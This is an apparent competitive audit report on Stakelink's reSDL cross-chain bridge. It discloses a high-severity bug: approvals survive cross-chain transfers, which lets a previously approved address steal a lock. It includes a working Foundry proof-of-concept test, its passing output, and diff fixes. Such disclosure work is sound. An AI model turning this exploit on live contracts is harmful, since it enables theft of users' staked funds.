# Stakelink

Code under review: [2023-12-stakelink](https://github.com/Cyfrin/2023-12-stake-link) (1414 nSLOC)

Placement: 12th out of 53.

## [H-01] Token approvals are not revoked when transferring reSDL across chains, leading to stolen funds.
>The official submission can be found on codehawks [here](https://www.codehawks.com/submissions/clqf7mgla0001yeyfah59c674/82)

### Summary
reSDL token approvals are not deleted when transferring reSDL cross-chain, allowing previously approved users to steal a reSDL lock once it's been transferred back to the original chain. 

### Vulnerability Details
Transferring reSDL locks between users is supposed to delete the approvals for that lockId, as new owners likely do not want the previously approved people to still be approved to their lock. This is evident in the NATSPEC of the function `SDLPool::approve`
<details>
<summary>NATSPEC of SDLPool::approve()</summary>

```javascript
    /**
     * @notice approves `_to` to transfer `_lockId` to another address
     * @dev
---> * - approval is revoked on transfer and can also be revoked by approving zero address
     * - reverts if sender is not owner of lock and not an approved operator for the owner
     * - reverts if `_to` is owner of lock
     * - reverts if `_lockId` is invalid
     * @param _to address approved to transfer
     * @param _lockId id of lock
     **/
```
</details>

The above requirement is properly enforced in the `SDLPool::_transfer()` internal function, due to the line:

```delete tokenApprovals[_lockId]```
(Line 464 of SDLPool.sol)

However, the requirement is not held when transferring reSDL tokens cross-chain.

When a user calls `RESDLTokenBridge::transferRESDL` to send a reSDL lock to the secondary chain, 
In `SDLPoolPrimary::handleOutgoingRESDL`, the token approvals for the lock `_lockId` are not deleted.
<details> 
<summary>Code</summary>

```javascript 
    Lock memory lock = locks[_lockId];

    delete locks[_lockId].amount;
    delete lockOwners[_lockId];
    balances[_sender] -= 1;
    // [H] @audit - what about token approvals?
    // The token approvals for reSDL are not deleted when we use the bridge to send reSDL to another chain!

    uint256 totalAmount = lock.amount + lock.boostAmount;
    effectiveBalances[_sender] -= totalAmount;
    effectiveBalances[ccipController] += totalAmount;

    sdlToken.safeTransfer(_sdlReceiver, lock.amount);

    emit OutgoingRESDL(_sender, _lockId);    
```
</details>

Similarly in `SDLPoolSecondary::handleOutgoingRESDL`, tokenApprovals are not deleted on sending reSDL back to the primary chain.

Note that how much ever the lock is transferred in the other chain, the approvals in that chain will constantly be deleted, but the approvals in the original chain remain intact.

### Impact

Since the approvals are not deleted whenever the reSDL token is transferred over to a different chain, the approval will still exist when the token is transferred back to the original chain. Once this happens, the approved user can transfer the lock to themselves, since they have approval to that lockId.

### Proof of Concept

**Summary:**

The following is one example of how the vulnerability can be exploited.

Initial State: initialOwner owns the lock with lockId=1 (the lockId is arbitrary, the vulnerability exists for every lockId possible).

Steps:

1. A user (initialOwner) approves their alt account (initialOwner_Alt), before transferring their reSDL lock to another user (receiverOfLock) on secondary chain
2. The user who just received it on the secondary chain transfers the lock to someone else (otherReceiverOfLock), this only deletes approvals on the secondary chain
3. The otherReceiverOfLock transfers their lock back to the primary chain, with the receiver being their own address.
4. initialOwner_Alt who is still approved calls `primarySDL.transferFrom(otherReceiverOfLock, initialOwner_Alt, lockIds[0]);` to transfer the lock back to themselves.
 
> Note that the following foundry test may not be immediately runnable on any machine, as it uses a few custom mocks that bypass the need for CCIP but mimic the functionality of the protocol. 

<details><summary>Setting up</summary>

```javascript
contract YourTestContract is Test {

    struct OnRamp {
        uint64 destChainSelector;
        address onRamp;
    }
    struct OffRamp {
        uint64 sourceChainSelector;
        address offRamp;
    }

    uint64 primaryChainSelector = 77;
    uint64 secondaryChainSelector = 78;

    ERC677Token linkToken;
    ERC677Token sdlToken;
    ERC677Token token2;
    WrappedNative wrappedNative;
    LinearBoostController boostController;

    SDLPoolPrimary primarySDL;
    SDLPoolSecondary secondarySDL;

    CCIPTokenPoolMock tokenPool;
    CCIPTokenPoolMock tokenPool2;

    MockRESDLTokenBridge bridgePrimary;
    MockRESDLTokenBridge bridgeSecondary;

    // USERS
    address user1 = makeAddr("1");
    address user2 = makeAddr("2");
    address user3 = makeAddr("3");

    function setUp() public {
        // Deploy ERC677 tokens

        address starterMaster = makeAddr("starterMaster"); // he gets all the supply @ the start
        linkToken = new ERC677Token("Chainlink", "LINK", starterMaster, 1000000000);
        sdlToken = new ERC677Token("SDLName", "SDL", starterMaster, 1000000000);
        token2 = new ERC677Token("Token2", "T2", starterMaster, 1000000000);

        // Deploy other contracts
        wrappedNative = new WrappedNative();
        address armProxy = address(new CCIPArmProxyMock());
        address router = address(new Router(address(wrappedNative), armProxy));


        // TokenPool
        tokenPool = new CCIPTokenPoolMock(address(sdlToken));
        tokenPool2 = new CCIPTokenPoolMock(address(token2));

        address[] memory tokens = new address[](2);
        tokens[0] = address(sdlToken);
        tokens[1] = address(token2);
        address[] memory tokenPools = new address[](2);
        tokenPools[0] = address(tokenPool);
        tokenPools[1] = address(tokenPool2);

        boostController = new LinearBoostController(4 * 365 * 86400, 4);
        
        SDLPoolPrimary primarySDLImplementation = new SDLPoolPrimary();
        SDLPoolSecondary secondarySDLImplementation = new SDLPoolSecondary();
        
        // make proxies
        ERC1967Proxy proxyPrimary = new ERC1967Proxy(address(primarySDLImplementation), "");
        ERC1967Proxy proxySecondary = new ERC1967Proxy(address(secondarySDLImplementation), "");

        // Interface at the proxy address
        primarySDL = SDLPoolPrimary(address(proxyPrimary));
        secondarySDL = SDLPoolSecondary(address(proxySecondary));

        //initialize the implementations
        primarySDL.initialize('reSDL', 'reSDL', address(sdlToken), address(boostController));
        secondarySDL.initialize('reSDL', 'reSDL', address(sdlToken), address(boostController), 5);
        
        //Pool Controllers
        MockPrimaryController primaryController = new MockPrimaryController(router, address(linkToken), address(sdlToken), address(primarySDL), 10 ether);
        MockSecondaryController secondaryController = new MockSecondaryController(router, address(linkToken), address(sdlToken), address(secondarySDL), 77, makeAddr("4"), 10 ether, '0x');

        // Bridges
        bridgePrimary = new MockRESDLTokenBridge(address(linkToken), address(sdlToken), address(primarySDL), address(primaryController));
        bridgeSecondary = new MockRESDLTokenBridge(address(linkToken), address(sdlToken), address(secondarySDL), address(secondaryController));

        // Setting up primary side
        primaryController.setRESDLTokenBridge(address(bridgePrimary));
        primarySDL.setCCIPController(address(primaryController));

        vm.prank(address(bridgePrimary));
        linkToken.approve(address(bridgePrimary), type(uint256).max);

        bridgePrimary.setExtraArgs(77, '0x11');
        primaryController.addWhitelistedChain(77, user1, '0x', '0x');
        sdlToken.mint(user2, 2000 ether);

        // Setting up secondary side
        secondaryController.setRESDLTokenBridge(address(bridgeSecondary));
        secondarySDL.setCCIPController(address(secondaryController));

        
        // Creating 2 different locks in the primary pool
        vm.startPrank(user2);
        sdlToken.transferAndCall(
        address(primarySDL),
        200 ether,
        abi.encode(uint256(0), uint64(0)));


        sdlToken.transferAndCall(
        address(primarySDL),
        1000 ether,
        abi.encode(uint256(0), uint64(365 * 86400)));

        vm.stopPrank();
    }
}
```
</details>
<details>
<summary>Proof of Code</summary>

```javascript
function test_POC_ApprovalsNotDeleted() public {
    // This shows that approvals in one chain are not deleted when a lock is sent to another chain

    address initialOwner = makeAddr("2");
    address receiverOfLock = makeAddr("3");

    address initialOwner_Alt = makeAddr("2Alt");

    vm.startPrank(initialOwner);
    // Approve the alt account
    primarySDL.approve(initialOwner_Alt, 1);

    // Log the approvals of lockId=1
    address approvals = primarySDL.getApproved(1);
    console2.log("Approvals of token1: %s", approvals);
    console2.log("Alt account of initial owner: %s\n", initialOwner_Alt);

    console2.log("SENDING LOCK TO SECONDARY CHAIN\n");
    bridgePrimary.transferRESDL(78, address(bridgeSecondary), receiverOfLock, 1, false);
    vm.stopPrank();

    // Now transfer the lock in the secondary chain
    address otherReceiverOfLock = makeAddr("4");
    vm.startPrank(receiverOfLock);
    console2.log("TRANSFERRING LOCK TO `otherReceiverOfLock`, ON SECONDARY CHAIN\n");

    // This deletes the approvals of the lock, but only in the secondary chain
    secondarySDL.transferFrom(receiverOfLock, otherReceiverOfLock, 1);
    vm.stopPrank();
    assertEq(secondarySDL.ownerOf(1), otherReceiverOfLock);

    // Then send it back to themselves on the primary chain
    vm.startPrank(otherReceiverOfLock);
    console2.log("SENDING LOCK BACK TO PRIMARY CHAIN\n");
    bridgeSecondary.transferRESDL(77, address(bridgePrimary), otherReceiverOfLock, 1, false);
    vm.stopPrank();

    // Check that the approvals are still there
    approvals = primarySDL.getApproved(1);
    console2.log("Approvals of token1: %s", approvals);
    console2.log("Alt account of initial owner: %s\n", initialOwner_Alt);

    // Check that `otherReceiverOfLock` is still the owner of the lock
    uint256[] memory lockIds = primarySDL.getLockIdsByOwner(otherReceiverOfLock);
    assertEq(lockIds[0], 1);

    // Check that og owner's alt account can transfer it to themselves
    vm.startPrank(initialOwner_Alt);
    console2.log("USING APPROVAL TO TRANSFER LOCK TO `initialOwner_Alt`");
    primarySDL.transferFrom(otherReceiverOfLock, initialOwner_Alt, lockIds[0]);
    vm.stopPrank();

    // Check that the alt account now owns the lock with lockId=1, effectively stolen from `otherReceiverOfLock`
    lockIds = primarySDL.getLockIdsByOwner(initialOwner_Alt);
    assertEq(lockIds[0], 1);

    console2.log("New owner of lockId=1: %s", primarySDL.ownerOf(1));
}
```
</details>

<details>
<summary> Console Output </summary>

```zsh
Running 1 test for test/PoC/Proofs.t.sol:YourTestContract
[PASS] test_POC_ApprovalsNotDeleted() (gas: 489600)
Logs:
  Approvals of token1: 0x77990f6fAB74c49C1Cf63A93fCDA0A40C86E65f4
  Alt account of initial owner: 0x77990f6fAB74c49C1Cf63A93fCDA0A40C86E65f4

  SENDING LOCK TO SECONDARY CHAIN

  TRANSFERRING LOCK TO `otherReceiverOfLock`, ON SECONDARY CHAIN

  SENDING LOCK BACK TO PRIMARY CHAIN

  Approvals of token1: 0x77990f6fAB74c49C1Cf63A93fCDA0A40C86E65f4
  Alt account of initial owner: 0x77990f6fAB74c49C1Cf63A93fCDA0A40C86E65f4

  USING APPROVAL TO TRANSFER LOCK TO `initialOwner_Alt`
  New owner of lockId=1: 0x77990f6fAB74c49C1Cf63A93fCDA0A40C86E65f4

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.33ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
</details> 

### Tools Used
Manual Review

### Recommendations
Delete the token approvals whenever reSDL tokens are transferred to another chain.
This will ensure that approved users dont have the ability to transfer reSDL tokens once the tokens have been transferred cross-chain.

In `SDLPoolPrimary::handleOutgoingRESDL`:
<details><summary>SDLPoolPrimary Mitigation</summary>

```diff
function handleOutgoingRESDL(
        address _sender,
        uint256 _lockId,
        address _sdlReceiver
    )
        external
        onlyCCIPController
        onlyLockOwner(_lockId, _sender)
        updateRewards(_sender)
        updateRewards(ccipController)
        returns (Lock memory)
    {
        Lock memory lock = locks[_lockId];

        delete locks[_lockId].amount; 
        delete lockOwners[_lockId];
+       delete tokenApprovals[_lockId];
        balances[_sender] -= 1;


        uint256 totalAmount = lock.amount + lock.boostAmount;
        effectiveBalances[_sender] -= totalAmount;
        effectiveBalances[ccipController] += totalAmount;

        sdlToken.safeTransfer(_sdlReceiver, lock.amount); // @audit - _sdlReceiver is the address of the CCIPController.

        emit OutgoingRESDL(_sender, _lockId);

        return lock;
    }
```
</details>

Similarly, in `SDLPoolSecondary::handleOutgoingRESDL`:
<details><summary>SDLPoolSecondary Mitigation</summary>

```diff
function handleOutgoingRESDL(
        address _sender,
        uint256 _lockId,
        address _sdlReceiver
    ) external onlyCCIPController onlyLockOwner(_lockId, _sender) updateRewards(_sender) returns (Lock memory) {
        if (queuedLockUpdates[_lockId].length != 0) revert CannotTransferWithQueuedUpdates();

        Lock memory lock = locks[_lockId];

        delete locks[_lockId].amount;
        delete lockOwners[_lockId];
+       delete tokenApprovals[_lockId];
        balances[_sender] -= 1;

        uint256 totalAmount = lock.amount + lock.boostAmount;
        effectiveBalances[_sender] -= totalAmount;
        totalEffectiveBalance -= totalAmount;

        sdlToken.safeTransfer(_sdlReceiver, lock.amount);

        emit OutgoingRESDL(_sender, _lockId);

        return lock;
    }
```

</details>
		
